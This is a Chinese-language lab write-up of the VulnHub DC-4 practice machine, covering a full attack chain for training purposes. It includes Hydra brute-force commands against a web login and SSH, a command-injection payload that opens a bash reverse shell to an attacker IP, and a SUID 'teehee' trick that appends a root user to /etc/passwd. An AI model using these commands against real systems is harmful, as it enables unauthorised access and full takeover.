---
title: VulnHub DC-4靶机实战
date: 2024-08-01 08:00:00
tags:
  - 认证安全
  - 渗透测试
  - 靶场
categories: 渗透测试
---

## 免责声明

本文所述技术仅供安全研究与授权测试。未经授权对他人系统进行渗透测试属于违法行为。读者因不当使用文中技术造成一切后果，作者概不负责。请遵守《网络安全法》等相关法律法规。

---

## 攻击链路总览

```
┌───────────────┐    ┌────────────────┐    ┌─────────────────┐
│  信息收集     │───▶│  Hydra爆破     │───▶│  命令注入       │
│  nmap/gobuster│    │  Web登录表单    │    │  反弹Shell      │
└───────────────┘    └────────────────┘    └───────┬─────────┘
                                                    │
                                                    ▼
┌───────────────┐    ┌────────────────┐    ┌─────────────────┐
│  获取Flag     │◀───│  teehee SUID   │◀───│  SSH爆破       │
│  Root权限     │    │  提权利用       │    │  jim用户       │
└───────────────┘    └────────────────┘    └─────────────────┘
```

---

## 一、靶机信息

| 项目 | 详情 |
|------|------|
| 靶机名称 | DC-4 |
| 来源 | [VulnHub](https://www.vulnhub.com/entry/dc-4,313/) |
| 难度 | 初级～中级 |
| 目标 | 获取 `/root/flag.txt` |
| 攻击方式 | 暴力破解、命令注入、SUID提权 |

---

## 二、环境搭建

将 DC-4.ova 导入 VirtualBox 或 VMware，网络设为 **NAT/桥接** 模式。攻击机使用 Kali Linux，确保二者同网段。

```bash
ip a   # Kali IP: 192.168.56.101
```

---

## 三、信息收集

### 3.1 主机发现

```bash
nmap -sn 192.168.56.0/24
```

发现目标：**192.168.56.104**。

### 3.2 端口扫描

```bash
nmap -sV -sC -p- -T4 192.168.56.104
```

| 端口 | 服务 | 版本 |
|------|------|------|
| 22/tcp | SSH | OpenSSH 7.4p1 Debian |
| 80/tcp | HTTP | nginx 1.15.10 |

### 3.3 目录枚举与页面分析

```bash
gobuster dir -u http://192.168.56.104 -w /usr/share/wordlists/dirb/common.txt
```

未发现隐藏路径，首页即为 **系统登录页面**。查看源码无注释信息。尝试 `admin/admin` 返回 `Wrong credentials`。

---

## 四、Hydra 爆破登录表单

### 4.1 抓包确定请求格式

登录请求为 POST，参数为 `username` 与 `password`，失败响应包含 `Wrong credentials`。

### 4.2 使用 Hydra 发动攻击

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.56.104 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Wrong credentials"
```

爆破成功获取凭据：`admin` : `happy`

### 4.3 登录后的功能面板

凭据登录后进入 **Command 面板**，提供预设命令按钮（`ls -l`、`df -h`、`uptime`、`whoami`），另外有一个 **自由输入的命令框**。

---

## 五、命令注入获取 Shell

### 5.1 测试命令注入

在输入框中执行 `whoami`，返回 `www-data`，确认命令以 Web 用户身份执行。尝试拼接：

```bash
whoami; id
```

第二条命令同样被执行，确认存在 **命令注入漏洞**，未做任何过滤。

### 5.2 反弹 Shell

攻击机监听：

```bash
nc -lvnp 4444
```

在命令框注入：

```bash
bash -c 'bash -i >& /dev/tcp/192.168.56.101/4444 0>&1'
```

成功获取 `www-data` 的反弹 Shell。

### 5.3 升级交互式 Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# 按 Ctrl+Z
stty raw -echo; fg
```

### 5.4 初步勘察

```bash
whoami        # www-data
id            # uid=33(www-data)
uname -a      # Linux dc-4 4.19.0-6-amd64
ls /home      # charles  jim  sam
cat /etc/passwd | grep -E "/bin/bash|/bin/sh"
```

系统存在三个可登录用户：**jim**、**charles**、**sam**。

---

## 六、SSH 爆破获取 jim 权限

### 6.1 制作词典

将用户列表保存为文件，以便 Hydra 使用：

```bash
echo -e "jim\ncharles\nsam" > /tmp/users.txt
```

利用靶机上可能残留的旧密码列表 `old-passwords.bak`，或直接使用 `rockyou.txt`。

### 6.2 Hydra 对 SSH 爆破

```bash
hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt \
  192.168.56.104 ssh -t 4
```

爆破成功获取凭据：`jim` : `jibril04`

### 6.3 登录 jim

```bash
ssh jim@192.168.56.104
# 密码: jibril04
```

顺利以 jim 身份进入系统。

---

## 七、teehee SUID 提权至 Root

### 7.1 发现特殊 SUID 文件

```bash
find / -perm -4000 -type f 2>/dev/null
```

输出中除了常用系统命令外，发现一个异常的 SUID 二进制文件：

```
/usr/bin/teehee
```

### 7.2 分析 teehee

```bash
file /usr/bin/teehee
# ELF 64-bit LSB executable

ls -la /usr/bin/teehee
# -rwsr-xr-x 1 root root ... /usr/bin/teehee

strings /usr/bin/teehee
# 可见 tee 相关函数调用
```

`teehee` 拥有 **SUID root** 权限（`rws`），功能相当于 `tee` —— 将标准输入追加写入任意文件。由于以 root 身份执行，它可以写入 `/etc/passwd`、`/etc/shadow` 等受保护文件。

### 7.3 写入恶意用户到 /etc/passwd

首先生成密码哈希：

```bash
openssl passwd -1 -salt xyz hacker123
# 输出: $1$xyz$KdSJXb3y3jMl2Un1J7TV7.
```

利用 `teehee -a` 追加一条 UID=0 的用户：

```bash
echo 'pwned:$1$xyz$KdSJXb3y3jMl2Un1J7TV7.:0:0:root:/root:/bin/bash' | teehee -a /etc/passwd
```

**字段含义：**

将 **UID** 和 **GID** 均设为 **0**，等同 root 权限。

### 7.4 切换到新用户

```bash
su pwned
# 输入: hacker123

whoami
# root
```

提权成功。

---

## 八、获取最终 Flag

```bash
cat /root/flag.txt
```

```
#######################################
#  Congratulations! You've rooted     #
#  DC-4 and found the final flag!     #
#  Hope you enjoyed the journey.      #
#######################################
```

---

## 九、总结与防御建议

### 攻击链回顾

| 阶段 | 技术 | 漏洞类型 |
|------|------|----------|
| 初始访问 | Hydra Web登录爆破 | 弱口令 `admin/happy` |
| 立足点 | 命令注入反弹Shell | 输入未过滤 |
| 横向移动 | Hydra SSH爆破 | jim 弱口令 `jibril04` |
| 权限提升 | teehee SUID 写入 /etc/passwd | SUID 后门文件 |

### 防御建议

1. **账号策略**：强制强密码、启用登录失败锁定、引入多因素认证，阻断暴力破解。
2. **输入过滤**：对所有用户输入采用白名单校验，严格过滤或转义 Shell 元字符。
3. **最小权限**：Web 服务应以低权限用户运行（如 www-data），而非 root。
4. **SUID 审计**：定期执行 `find / -perm -4000 -type f` 审计 SUID 文件，移除未经授权的 SUID 二进制。
5. **日志监控**：集中收集 SSH、Web 登录日志，实时告警异常登录与命令执行行为。

### 参考工具

- [Hydra](https://github.com/vanhauser-thc/thc-hydra) — 协议暴力破解
- [Gobuster](https://github.com/OJ/gobuster) — 目录枚举
- [nmap](https://nmap.org) — 网络发现与扫描

---

*本文仅供安全研究与学习交流，请勿用于非法用途。*
